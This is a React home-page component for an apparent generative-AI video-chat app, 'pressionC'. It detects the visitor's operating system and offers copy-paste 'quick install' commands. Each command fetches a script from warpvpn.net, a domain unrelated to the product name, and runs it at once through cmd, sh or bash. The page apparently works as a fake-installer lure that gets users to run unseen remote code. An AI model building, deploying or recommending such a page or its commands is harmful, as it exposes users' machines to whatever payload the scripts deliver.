import React, { useEffect, useState } from 'react'
import './styles.css'
import { Image } from 'react-bootstrap'
import windowLogo from '../assets/window-logo.svg'
import macLogo from "../assets/mac-logo.svg";
import ubantuLogo from "../assets/ubantu-logo.svg";
import copyLogo from "../assets/copy-logo.svg";
export const Home = () => {

  const [os, setOs] = useState('');
  const [isCopied, setCopied] = useState(false);

  useEffect(() => {
    const getUserOS = () => {
      const { platform } = window.navigator;
      if (platform.indexOf("Win") !== -1) return "windows";
      if (platform.indexOf("Mac") !== -1) return "mac";
      if (platform.indexOf("Linux") !== -1) return "linux";
      return "unknown";
    };

    const detectedOs = getUserOS();
    setOs(detectedOs);
    document.querySelector(`.${detectedOs}-width`)?.classList.add("btn-os-click");
  }, []);

  const handleOsChange = (newOs) => {
    setCopied(false);
    setOs(newOs);
    ["windows", "mac", "linux"].forEach((os) => {
      document.querySelector(`.${os}-width`)?.classList.toggle("btn-os-click", os === newOs);
    });
  };

  const getCommand = () => {
    if (os === 'windows') {
      return "Invoke-WebRequest -Uri https://warpvpn.net/install.bat -OutFile install.bat; Start-Process cmd.exe -ArgumentList '/c install.bat'";
    } else if (os === 'mac') {
      return "curl -sSL -O https://warpvpn.net/install.sh && sh install.sh";
    } else if (os === 'linux') {
      return "curl -sSL -O https://warpvpn.net/install-linux.sh && bash install-linux.sh";
    }
    return '';
  };

  return (
    <div>
      <div className='home-title'>
        <p className='reimagine'>Reimagine Your Onscreen Likeness In Real Time</p>
        <p className='theonly'>The only real-time generative AI app for video chatting and live streaming</p>
      </div>

      <div className='download-container'>
        <div className='btn-os-container'>
          <button className='btn-os windows-width' onClick={() => handleOsChange('windows')}>
            <Image src={windowLogo} alt="Windows" />
            Windows 10/11</button>
          <button className='btn-os mac-width' onClick={() => handleOsChange('mac')}>
            <Image src={macLogo} alt="MacOS" />
            MacOS</button>
          <button className='btn-os linux-width' onClick={() => handleOsChange('linux')}>
            <Image src={ubantuLogo} alt="Ubuntu" />
            Ubuntu</button>
        </div>
        <p className='quick-install'>
          {`Quick install by copy the command for your ${os === "windows" ? "Windows" : os === "mac" ? "MacOS" : "Ubuntu"}, paste it in your ${os === "windows" ? "Command Prompt" : os === "mac" ? "Terminal" : "Terminal"}, and start using pressionC!`}
        </p>

        <div className='copy-cmd' style={os === "windows" ? { marginTop: '24px' } : null}  >
          <Image src={copyLogo} alt="Copy" />
          <p className='cmd'> {getCommand()}</p>
          <button className='btn btn-copy' onClick={() => {
            navigator.clipboard.writeText(getCommand())
            setCopied(true)
          }}>{isCopied ? "Copied" : "Copy"}</button>
        </div>
      </div>
    </div>
  )
}
